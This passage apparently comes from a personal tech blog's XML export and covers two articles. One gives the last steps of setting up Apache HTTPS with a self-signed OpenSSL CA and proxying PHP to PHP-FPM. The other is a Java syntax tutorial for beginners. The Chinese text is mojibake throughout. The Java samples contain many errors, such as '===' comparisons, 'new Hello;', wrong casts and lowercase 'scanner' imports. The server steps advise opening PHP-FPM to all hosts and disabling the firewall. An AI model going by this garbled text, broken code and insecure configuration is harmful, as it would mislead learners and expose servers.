&#x2F;etc&#x2F;httpd&#x2F;ssl&#x2F;httpd.csr<br>åˆ›å»ºè¯ä¹¦ç”³è¯·<br>ç¬¬ä¸‰æ­¥ ç­¾ç½²è¯ä¹¦<br>1ï¼š	touch &#x2F;etc&#x2F;pki&#x2F;CA&#x2F;index.txt ;echo 01 &gt;&#x2F;etc&#x2F;pki&#x2F;CA&#x2F;serial<br>åˆ›å»ºè¯ä¹¦æ•°æ®åº“;è¯ä¹¦é¢å‘åˆ—è¡¨<br>2ï¼š openssl ca -in &#x2F;etc&#x2F;httpd&#x2F;ssl&#x2F;httpd.csr -out &#x2F;etc&#x2F;pki&#x2F;CA&#x2F;certs&#x2F;httpd.crt -days 365<br>ç­¾å‘è¯ä¹¦<br>ä½¿ç”¨è¯ä¹¦å®ç°https<br>1 :å®‰è£…mod_ssl<br>2 : &#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;ssl.conf<br>1: SSLCertificateFile &#x2F;etc&#x2F;httpd&#x2F;ssl&#x2F;httpd.crt æŒ‡å®šè¯ä¹¦çš„ä½ç½®<br>2ï¼šSSLCertificateKeyFile &#x2F;etc&#x2F;httpd&#x2F;ssl&#x2F;httpd.key æŒ‡å®šç§é’¥çš„ä½ç½®</p>
<h2 id="åç»­æ­¥éª¤"><a href="#åç»­æ­¥éª¤" class="headerlink" title="åç»­æ­¥éª¤"></a>åç»­æ­¥éª¤</h2><p>sz &#x2F;etc&#x2F;pki&#x2F;CA&#x2F;cacert.pem &#x2F;&#x2F;å°†è¯ä¹¦æ‹·è´åˆ°æ¡Œé¢,æ·»åŠ åˆ°å—ä¿¡ä»»çš„æ ¹è¯ä¹¦ç­¾å‘æœºæ„</p>
<p><code>åŒå‡»è¯ä¹¦å®‰è£…</code></p>
<p>win+r è¾“å…¥MMC æ·»åŠ ä¸€ä¸ªç®¡ç†èŠ‚ç‚¹ é€‰æ‹©è¯ä¹¦ æŸ¥çœ‹å®‰è£…çš„è¯ä¹¦</p>
<p>åœ¨&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;ssl.conf åœ¨è™šæ‹Ÿä¸»æœºé‡Œé¢æ·»åŠ è¯ä¹¦çš„è·¯å¾„ä¸ç§é’¥çš„è·¯å¾„</p>
<p>SSLCertificateFile &#x2F;etc&#x2F;httpd&#x2F;ssl&#x2F;httpd.crt &#x2F;&#x2F;è¯ä¹¦è·¯å¾„</p>
<p>SSLCertificateKeyFile &#x2F;etc&#x2F;httpd&#x2F;ssl&#x2F;httpd.key &#x2F;&#x2F;ç§é’¥è·¯å¾„</p>
<p>æ·»åŠ è™šæ‹Ÿä¸»æœºçš„é…ç½®åˆ°ssl.conf æ·»åŠ ä»¥ä¸‹å†…å®¹</p>
<p>ServerName <a href="http://www.test.com:443/">www.test.com:443</a><br> DocumentRoot â€œ&#x2F;testâ€<br>&lt;Directory â€œ&#x2F;aâ€&gt;<br>     require all granted<br> </Directory><br>ProxyPassMatch &#x2F;(.*.php$) â€œfcgi:&#x2F;&#x2F;192.168.0.107:9000&#x2F;phptest&#x2F;$1â€  &#x2F;&#x2F;åå‘ä»£ç†åˆ°phpæœåŠ¡å™¨</p>
<p>apacheæœåŠ¡å™¨ä¸Šåº”è¯¥å¸è½½phpæ¨¡å—ï¼Œä½†ä¿ç•™php.confé…ç½®æ–‡ä»¶å¹¶æ³¨é‡Šæ‰å…¶æœ€åä¸¤è¡Œå†…å®¹</p>
<p>phpæœåŠ¡å™¨ä¸Šåº”è¯¥ä¿®æ”¹ä»¥ä¸‹å†…å®¹</p>
<p>listen &#x3D; 9000 &#x2F;&#x2F;ç›‘å¬æ‰€æœ‰çš„ipåœ°å€çš„9000ç«¯å£</p>
<p>listen.allowed_clients &#x3D; 127.0.0.1 &#x2F;&#x2F;æ³¨é‡Šæ‰è¿™ä¸€è¡Œï¼Œè¡¨ç¤ºå…è®¸æ‰€æœ‰ä¸»æœºè®¿é—®è¯¥ç«™ç‚¹</p>
<p>&#x2F;&#x2F;<code>æ³¨æ„å…³é—­é˜²ç«å¢™</code> è®¿é—®æ—¶è®°å¾—ä¿®æ”¹hostsæ–‡ä»¶</p>
<h1 id="NGINX"><a href="#NGINX" class="headerlink" title="NGINX"></a>NGINX</h1>]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>åè®®è§„èŒƒ</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
        <tag>HTTPS</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaè¯­æ³•</title>
    <url>/archives/3377d36c.html</url>
    <content><![CDATA[<h1 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		System.out.print(<span class="string">&quot;armandhe&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="comment">//ç±»åä¸æ–‡ä»¶åå¿…é¡»ç›¸åŒï¼Œå¿…é¡»æœ‰mainæ–¹æ³•</span></span><br></pre></td></tr></table></figure>

<h1 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h1><h2 id="åŸºæœ¬æ•°æ®ç±»å‹"><a href="#åŸºæœ¬æ•°æ®ç±»å‹" class="headerlink" title="åŸºæœ¬æ•°æ®ç±»å‹"></a>åŸºæœ¬æ•°æ®ç±»å‹</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String st=<span class="string">&quot;armandhe&quot;</span>; <span class="comment">//å¿…é¡»ä½¿ç”¨åŒå¼•å·ï¼Œå®šä¹‰å­—ç¬¦ä¸²ï¼Œä¸æ˜¯åŸºæœ¬æ•°æ®ç±»å‹ï¼Œè€Œæ˜¯ä¸€ä¸ªç±»</span></span><br><span class="line"><span class="type">byte</span> by=<span class="number">1</span>;</span><br><span class="line"><span class="type">short</span> sh=<span class="number">127</span>;</span><br><span class="line"><span class="type">int</span> in=<span class="number">65535</span>;</span><br><span class="line"><span class="type">long</span> lo=<span class="number">2111111L</span>;</span><br><span class="line"><span class="type">char</span> ch=<span class="string">&#x27;a&#x27;</span>; <span class="comment">//å¿…é¡»ä½¿ç”¨å•å¼•å·</span></span><br><span class="line"><span class="type">float</span> fl=<span class="number">0.4f</span>;</span><br><span class="line"><span class="type">double</span> dou=<span class="number">45.35</span>;</span><br><span class="line"><span class="type">boolean</span> bo=<span class="literal">true</span>;</span><br><span class="line">str1=<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;armanghe&quot;</span>); <span class="comment">//strçš„ç±»å‹æ˜¯ä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line">str1=<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;armanghe&quot;</span>); </span><br><span class="line">str1 === str2 <span class="comment">//false</span></span><br><span class="line">String str3=<span class="string">&quot;armandhe&quot;</span>;</span><br><span class="line">String str4=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line">str3===str4 <span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<h2 id="æ•°æ®ç±»å‹è½¬æ¢"><a href="#æ•°æ®ç±»å‹è½¬æ¢" class="headerlink" title="æ•°æ®ç±»å‹è½¬æ¢"></a>æ•°æ®ç±»å‹è½¬æ¢</h2><p>åªèƒ½è½¬æ¢èƒ½è½¬æ¢çš„ç±»å‹</p>
<h3 id="è½¬æ¢ä¼˜å…ˆçº§"><a href="#è½¬æ¢ä¼˜å…ˆçº§" class="headerlink" title="è½¬æ¢ä¼˜å…ˆçº§"></a>è½¬æ¢ä¼˜å…ˆçº§</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ç”±ä½åˆ°é«˜</span></span><br><span class="line"><span class="type">byte</span> <span class="type">short</span> <span class="type">char</span> --&gt; <span class="type">int</span> --&gt; <span class="type">long</span> --&gt; <span class="type">float</span> --&gt; <span class="type">double</span></span><br></pre></td></tr></table></figure>

<p><code>ä½åˆ°é«˜ä¼šå‘ç”Ÿè‡ªåŠ¨ç±»å‹è½¬æ¢ï¼Œé«˜åˆ°ä½éœ€è¦è¿›è¡Œå¼ºåˆ¶è½¬æ¢</code> </p>
<h3 id="å¼ºåˆ¶ç±»å‹è½¬æ¢"><a href="#å¼ºåˆ¶ç±»å‹è½¬æ¢" class="headerlink" title="å¼ºåˆ¶ç±»å‹è½¬æ¢"></a>å¼ºåˆ¶ç±»å‹è½¬æ¢</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> in=<span class="number">43</span>;</span><br><span class="line"><span class="type">byte</span> by=(<span class="type">int</span>)in; <span class="comment">//å¼ºåˆ¶è½¬æ¢ä¸ºbyteå‹</span></span><br><span class="line"><span class="type">int</span> in1=<span class="number">2343444</span>;</span><br><span class="line"><span class="type">int</span> in2=<span class="number">22222222</span>;</span><br><span class="line"><span class="type">long</span> in3=in1*(<span class="type">long</span>)in2; <span class="comment">//åœ¨è¿›è¡Œæ•°å€¼è¿ç®—çš„æ—¶å€™ä¸€å®šè¦æ³¨æ„æ•°å€¼ç±»å‹çš„èŒƒå›´ï¼Œå¦åˆ™å¯èƒ½å¯¼è‡´æº¢å‡ºï¼Œæ­¤æ–¹æ³•åœ¨è¿ç®—å‰å°†intè½¬æ¢ä¸ºlongç±»å‹ï¼Œé¿å…äº†æº¢å‡ºé—®é¢˜ã€‚</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h1><p>å€¼å¯ä»¥å˜åŒ–çš„é‡ã€‚å˜é‡æ˜¯å†…å­˜ä¸­çš„ä¸€æ®µç©ºé—´ï¼Œä¸å­˜å‚¨å€¼ï¼Œåªå­˜å‚¨å€¼å¾—åœ°å€ã€‚javaæ˜¯å¼ºç±»å‹å¾—è¯­è¨€ï¼Œæ¯ä¸ªå˜é‡éƒ½å¿…é¡»æŒ‡å®šç±»å‹ï¼Œå˜é‡å£°æ˜æˆ–è€…å®šä¹‰åå¿…é¡»ä»¥åˆ†å·ç»“å°¾ã€‚</p>
<h2 id="å˜é‡ä½œç”¨åŸŸ"><a href="#å˜é‡ä½œç”¨åŸŸ" class="headerlink" title="å˜é‡ä½œç”¨åŸŸ"></a>å˜é‡ä½œç”¨åŸŸ</h2><h3 id="ç±»å˜é‡"><a href="#ç±»å˜é‡" class="headerlink" title="ç±»å˜é‡"></a>ç±»å˜é‡</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span>&#123;</span><br><span class="line">		<span class="keyword">static</span> <span class="type">int</span> i;</span><br><span class="line">		<span class="keyword">static</span> <span class="type">int</span> j=<span class="number">10</span>; <span class="comment">//ç±»å˜é‡</span></span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		System.out.print(i);</span><br><span class="line">		System.out.print(j)l</span><br><span class="line">&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">			<span class="comment">//æ–¹æ³•</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="å®ä¾‹å˜é‡"><a href="#å®ä¾‹å˜é‡" class="headerlink" title="å®ä¾‹å˜é‡"></a>å®ä¾‹å˜é‡</h3><p>å®šä¹‰åœ¨ç±»é‡Œé¢çš„å˜é‡ï¼Œå¿…é¡»é€šè¿‡ç±»å¼•ç”¨</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span>&#123;</span><br><span class="line">		<span class="type">int</span> i;</span><br><span class="line">		<span class="type">int</span> j=<span class="number">10</span>; <span class="comment">//å®ä¾‹å˜é‡</span></span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">			<span class="type">Hello</span> <span class="variable">hel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hello</span>;</span><br><span class="line">			System.out.print(hel.i); <span class="comment">//j==0 //æœªè¢«åˆå§‹åŒ–çš„å˜é‡ä¼šè¾“å‡ºå…¶åˆå§‹å€¼ï¼ŒåŸºæœ¬æ•°æ®ç±»å‹åŸºæœ¬ä¸º0ï¼Œå…¶ä»–å‡ä¸ºnull</span></span><br><span class="line">			System.out.print(hel.j); <span class="comment">//j==10</span></span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">			<span class="comment">//ç±»æ–¹æ³•</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å±€éƒ¨å˜é‡"><a href="#å±€éƒ¨å˜é‡" class="headerlink" title="å±€éƒ¨å˜é‡"></a>å±€éƒ¨å˜é‡</h3><p>å®šä¹‰åœ¨æ–¹æ³•ä¸­çš„å˜é‡</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">			<span class="type">Hello</span> <span class="variable">hel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hello</span>;</span><br><span class="line">			System.out.print(hel.i); <span class="comment">//j==0 //æœªè¢«åˆå§‹åŒ–çš„å˜é‡ä¼šè¾“å‡ºå…¶åˆå§‹å€¼ï¼ŒåŸºæœ¬æ•°æ®ç±»å‹åŸºæœ¬ä¸º0ï¼Œå…¶ä»–å‡ä¸ºnull</span></span><br><span class="line">			System.out.print(hel.j); <span class="comment">//j==10</span></span><br><span class="line">			test.i	</span><br><span class="line">&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">			<span class="comment">//ç±»æ–¹æ³•</span></span><br><span class="line">			<span class="type">int</span> i; <span class="comment">//å±€éƒ¨å˜é‡</span></span><br><span class="line">			System.out.print(i);</span><br><span class="line">			</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="å¸¸é‡"><a href="#å¸¸é‡" class="headerlink" title="å¸¸é‡"></a>å¸¸é‡</h1><p>å€¼å›ºå®šçš„é‡</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span>&#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">final</span> <span class="type">double</span> PI=<span class="number">3.1415926</span>; <span class="comment">//æƒ¯ä¾‹å˜é‡åå¤§å†™ï¼Œfinalæ˜¯ä¿®é¥°ç¬¦ï¼Œå…¶æ‰€å¤„ä½ç½®æ˜¯ä»»æ„çš„ã€‚</span></span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">			System.out.print(PI)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ç®—æ•°è¿ç®—ç¬¦"><a href="#ç®—æ•°è¿ç®—ç¬¦" class="headerlink" title="ç®—æ•°è¿ç®—ç¬¦"></a>ç®—æ•°è¿ç®—ç¬¦</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">+ - * / % ++ -- <span class="comment">//ç®—æ•°è¿ç®—ç¬¦</span></span><br><span class="line">= <span class="comment">//èµ‹å€¼è¿ç®—ç¬¦</span></span><br><span class="line">&lt; &gt; == &lt;= &gt;= != <span class="comment">//å…³ç³»è¿ç®—ç¬¦</span></span><br><span class="line">&amp;&amp; || ! <span class="comment">//é€»è¾‘è¿ç®—ç¬¦</span></span><br><span class="line">&amp; | ^ ~ &gt;&gt; &lt;&lt; &gt;&gt;&gt; <span class="comment">//ä½è¿ç®—ç¬¦</span></span><br><span class="line">? : <span class="comment">//æ¡ä»¶è¿ç®—ç¬¦ï¼Œä¸‰ç›®è¿ç®—ç¬¦</span></span><br><span class="line">+= -+ *= /= <span class="comment">//æ‰©å±•èµ‹å€¼è¿ç®—ç¬¦</span></span><br></pre></td></tr></table></figure>

<p>ç®—æ•°è¿ç®—æ—¶ï¼Œè‹¥è¿ç®—æ•°ç§ä¸å«æœ‰longç±»å‹ï¼Œé‚£ä¹ˆç»“æœç±»å‹å¿…æ˜¯intç±»å‹ï¼Œå¦‚æœlongç±»å‹å­˜åœ¨ï¼Œé‚£ä¹ˆç»“æœå¿…ä¸ºlongã€‚</p>
<h1 id="æµç¨‹æ§åˆ¶"><a href="#æµç¨‹æ§åˆ¶" class="headerlink" title="æµç¨‹æ§åˆ¶"></a>æµç¨‹æ§åˆ¶</h1><h2 id="Scannerå¯¹è±¡"><a href="#Scannerå¯¹è±¡" class="headerlink" title="Scannerå¯¹è±¡"></a>Scannerå¯¹è±¡</h2><h3 id="nextæ–¹å¼"><a href="#nextæ–¹å¼" class="headerlink" title="nextæ–¹å¼"></a>nextæ–¹å¼</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.scanner;</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="keyword">if</span> (s.hasNext())&#123; <span class="comment">//åˆ¤æ–­ç”¨æˆ·è¿˜æœ‰æ²¡æœ‰è¾“å…¥,æŒ‰ä¸‹å›è½¦åè¾“å…¥ç»“æŸ</span></span><br><span class="line">	<span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> s.next(); <span class="comment">//è·å–ç”¨æˆ·çš„è¾“å…¥</span></span><br><span class="line">	System.out.println(str); <span class="comment">//æ‰“å°ç”¨æˆ·è¾“å…¥</span></span><br><span class="line">&#125;</span><br><span class="line">s.close(); <span class="comment">//å…³é—­æ‰«æå™¨å¯¹è±¡ï¼Œæ–¹å¼ioæµçš„éƒ½éœ€è¦æ‰‹åŠ¨å…³é—­ï¼Œå¦åˆ™å°†ä¼šå ç”¨å¤§é‡çš„èµ„æºã€‚</span></span><br><span class="line"><span class="comment">//è¾“å…¥hello world </span></span><br><span class="line"><span class="comment">//è¾“å‡ºhello</span></span><br><span class="line"><span class="comment">//å³ä¸èƒ½è¾“å‡ºå¸¦æœ‰ç©ºç™½å­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œä»¥ç©ºç™½å­—ç¬¦ä¸ºç»“æŸç¬¦ï¼Œå¯¹äºé‡åˆ°æœ‰æ•ˆå­—ç¬¦å‰çš„ç©ºç™½ï¼Œå°†ä¼šè¢«å¿½ç•¥</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="nextlineæ–¹å¼"><a href="#nextlineæ–¹å¼" class="headerlink" title="nextlineæ–¹å¼"></a>nextlineæ–¹å¼</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.scanner;</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="keyword">if</span> (s.hasNextLine())&#123; <span class="comment">//åˆ¤æ–­ç”¨æˆ·è¿˜æœ‰æ²¡æœ‰è¾“å…¥,æŒ‰ä¸‹å›è½¦åè¾“å…¥ç»“æŸ</span></span><br><span class="line">	<span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> s.nextline(); <span class="comment">//è·å–ç”¨æˆ·çš„è¾“å…¥</span></span><br><span class="line">	System.out.println(str); <span class="comment">//æ‰“å°ç”¨æˆ·è¾“å…¥</span></span><br><span class="line">&#125;</span><br><span class="line">s.close(); <span class="comment">//å…³é—­æ‰«æå™¨å¯¹è±¡ï¼Œæ–¹å¼ioæµçš„éƒ½éœ€è¦æ‰‹åŠ¨å…³é—­ï¼Œå¦åˆ™å°†ä¼šå ç”¨å¤§é‡çš„èµ„æºã€‚</span></span><br><span class="line"><span class="comment">//ä»¥å›è½¦ä½œä¸ºç»“æŸç¬¦ï¼Œå¯ä»¥å¸¦æœ‰ç©ºç™½å­—ç¬¦ï¼Œå¯ä»¥ä¸éœ€è¦ä¸­é—´çš„åˆ¤æ–­è¯­å¥ã€‚</span></span><br></pre></td></tr></table></figure>

<h3 id="å…¶ä»–ç”¨æ³•"><a href="#å…¶ä»–ç”¨æ³•" class="headerlink" title="å…¶ä»–ç”¨æ³•"></a>å…¶ä»–ç”¨æ³•</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.scanner;</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">System.out.println(<span class="string">&quot;è¯·è¾“å…¥æ•´æ•°ï¼š&quot;</span>) </span><br><span class="line"><span class="keyword">if</span> (s.hasNextInt())&#123; <span class="comment">//hasNextInt hasNextFloat  hasNextDouble hasNextSting</span></span><br><span class="line">	i=s.**nextInt()**;</span><br><span class="line">	System.out.println(<span class="string">&quot;æ•´æ•°æ•°æ®ï¼š&quot;</span> + i);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	System.out.println(<span class="string">&quot;è¾“å…¥çš„ä¸æ˜¯æ•´æ•°&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">s.close(); </span><br></pre></td></tr></table></figure>

<h2 id="ä¾‹ï¼šæ±‚å’Œ"><a href="#ä¾‹ï¼šæ±‚å’Œ" class="headerlink" title="ä¾‹ï¼šæ±‚å’Œ"></a>ä¾‹ï¼šæ±‚å’Œ</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.scanner;</span><br><span class="line"><span class="type">double</span> sum;</span><br><span class="line"><span class="type">int</span> m=<span class="number">1</span>;</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="keyword">while</span> (s.hasNextDouble())&#123;</span><br><span class="line">	<span class="type">double</span> <span class="variable">x</span> <span class="operator">=</span> s.nextDouble();</span><br><span class="line">	x.equals(<span class="string">&quot;hello&quot;</span>) <span class="comment">//åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ï¼Œå°‘ä½¿ç”¨==å»åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰</span></span><br><span class="line">	System.out.println(<span class="string">&quot;ä½ è¾“å…¥äº†ç¬¬&quot;</span>+m+<span class="string">&quot;ä¸ªæ•°æ®&quot;</span>);</span><br><span class="line">	sum += x;</span><br><span class="line">	m += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;è¿™äº›æ•°å­—çš„æ€»å’Œä¸ºï¼š&quot;</span>+sum+<span class="string">&quot;;&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;è¿™äº›æ•°å­—çš„å¹³å‡å€¼ä¸ºï¼š&quot;</span>+sum/m+<span class="string">&quot;;&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="é¡ºåºç»“æ„"><a href="#é¡ºåºç»“æ„" class="headerlink" title="é¡ºåºç»“æ„"></a>é¡ºåºç»“æ„</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ä»ä¸Šåˆ°ä¸‹ä¸€æ¬¡æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure>

<h2 id="é€‰æ‹©ç»“æ„"><a href="#é€‰æ‹©ç»“æ„" class="headerlink" title="é€‰æ‹©ç»“æ„"></a>é€‰æ‹©ç»“æ„</h2><h3 id="å•é€‰æ‹©ç»“æ„ä¸æ™®é€šå¤šé€‰æ‹©ç»“æ„"><a href="#å•é€‰æ‹©ç»“æ„ä¸æ™®é€šå¤šé€‰æ‹©ç»“æ„" class="headerlink" title="å•é€‰æ‹©ç»“æ„ä¸æ™®é€šå¤šé€‰æ‹©ç»“æ„"></a>å•é€‰æ‹©ç»“æ„ä¸æ™®é€šå¤šé€‰æ‹©ç»“æ„</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition)&#123;</span><br><span class="line">	<span class="comment">//è¯­å¥</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (condition)&#123;</span><br><span class="line">	<span class="comment">//è¯­å¥</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">//è¯­å¥</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="switchå¤šé€‰æ‹©ç»“æ„"><a href="#switchå¤šé€‰æ‹©ç»“æ„" class="headerlink" title="switchå¤šé€‰æ‹©ç»“æ„"></a>switchå¤šé€‰æ‹©ç»“æ„</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>(expression)&#123;</span><br><span class="line">	<span class="keyword">case</span> value:</span><br><span class="line">		<span class="comment">//è¯­å¥</span></span><br><span class="line">	<span class="keyword">case</span> value:</span><br><span class="line">		<span class="comment">//è¯­å¥</span></span><br><span class="line">			.</span><br><span class="line">			.</span><br><span class="line">			.</span><br><span class="line">	<span class="keyword">default</span>: <span class="comment">//å¯é€‰</span></span><br><span class="line">		<span class="comment">//è¯­å¥</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//valueçš„å€¼å¯ä¸€ä¸–æ•°å­—ä¸å­—ç¬¦ä¸²(java SE 7ä¹‹åæ”¯æŒ)ï¼Œä¸è¿‡å­—ç¬¦ä¸²åªèƒ½æ˜¯**å­—é¢é‡**æˆ–è€…**å¸¸é‡**ä¸èƒ½ä¸ºå˜é‡</span></span><br><span class="line"><span class="comment">//å¦‚æœæ²¡æœ‰è®¾ç½®defauleé€‰é¡¹ï¼Œå¦‚æœè¾“å…¥æœªçŸ¥çš„æ•°æ®ï¼Œåˆ™ä¼šå‘ç”Ÿcaseç©¿é€ï¼Œå°†è¾“å‡ºæ¯ä¸€ç§æƒ…å†µçš„è®¡ç®—ç»“æœ</span></span><br><span class="line"><span class="comment">//ä¸ºäº†é¿å…caseç©¿é€ï¼Œéœ€è¦åŠ ä¸Šbreakï¼›å¦‚æœæ²¡æœ‰breakï¼Œé‚£ä¹ˆå°†åœ¨åŒ¹é…åˆ°ç¬¬ä¸€é¡¹åï¼Œç»§ç»­è¾“å‡ºåé¢çš„caseè¯­å¥ä¸­çš„è®¡ç®—ç»“æœï¼Œç›´åˆ°é‡åˆ°ä¸€ä¸ªbreakæˆ–è€…ç»“æŸ</span></span><br><span class="line"><span class="keyword">switch</span>(expression)&#123;</span><br><span class="line">	<span class="keyword">case</span> value:</span><br><span class="line">		<span class="comment">//è¯­å¥</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> value:</span><br><span class="line">		<span class="comment">//è¯­å¥</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">			.</span><br><span class="line">			.</span><br><span class="line">			.</span><br><span class="line">	<span class="keyword">default</span>: <span class="comment">//å¯é€‰</span></span><br><span class="line">		<span class="comment">//è¯­å¥</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å¾ªç¯ç»“æ„"><a href="#å¾ªç¯ç»“æ„" class="headerlink" title="å¾ªç¯ç»“æ„"></a>å¾ªç¯ç»“æ„</h2><h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (condition)&#123;</span><br><span class="line">	<span class="comment">//è¯­å¥</span></span><br><span class="line">	<span class="comment">//break è·³å‡ºæ•´ä¸ªå¾ªç¯ï¼Œé€€å‡ºå¾ªç¯</span></span><br><span class="line">	<span class="comment">//continue è·³å‡ºå½“å‰å¾ªç¯ï¼Œè¿›å…¥ä¸‹ä¸€è½®å¾ªç¯</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="do-while"><a href="#do-while" class="headerlink" title="do while"></a>do while</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">	<span class="comment">//è¯­å¥</span></span><br><span class="line">&#125;<span class="keyword">while</span>(condition);</span><br></pre></td></tr></table></figure>

